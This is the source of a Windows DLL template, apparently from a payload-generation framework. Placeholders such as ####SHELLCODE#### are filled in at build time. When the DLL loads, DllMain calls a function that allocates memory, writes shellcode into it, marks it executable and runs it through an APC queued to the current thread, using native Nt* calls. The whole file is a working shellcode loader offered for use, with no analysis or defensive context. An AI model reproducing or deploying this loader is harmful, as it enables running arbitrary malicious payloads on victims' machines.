#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <tchar.h>

//####INCLUDE####

//####DEFINE####

//####CODE####


DWORD WINAPI esc_main();

#define DLLEXPORT __declspec( dllexport )

__declspec(dllexport)BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    //HANDLE threadhandle;
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            printf("DLL_PROCESS_ATTACH\n");
            esc_main();
            break;
        case DLL_PROCESS_DETACH:
            printf("DLL_PROCESS_DETACH\n");
            break;
        case DLL_THREAD_ATTACH:
            printf("DLL_THREAD_ATTACH\n");
            break;
        case DLL_THREAD_DETACH:
            printf("DLL_THREAD_DETACH\n");
            break;
    }
    return TRUE;
}

DWORD WINAPI esc_main()
{
    DWORD dwSize;
    //HANDLE currentProcess;

    unsigned char encoded[] = ####SHELLCODE####;
    SIZE_T length = sizeof(encoded);

    //unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    //memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    //####CALL####
    unsigned char* decoded = encoded;


    //####SYSCALL####
    HANDLE hProc = GetCurrentProcess();
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE hThread = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = length;


    // Allocate memory for shellcode
    NTSTATUS status = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // Write shellcode to allocated memory
    status = NtWriteVirtualMemory(hProc, base_addr, decoded, length, &bytesWritten);
    
    // Change memory protection to executable
    status = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&length, PAGE_EXECUTE_READ, &oldprotect);
    
    // Queue APC to current thread
    HANDLE currentThread = GetCurrentThread();
    status = NtQueueApcThread(currentThread, base_addr, NULL, NULL, NULL);
    
    // Alert the thread to process the APC
    status = NtTestAlert();
    
    // Clean up handle
    NtClose(hProc);
    
    return 0;
}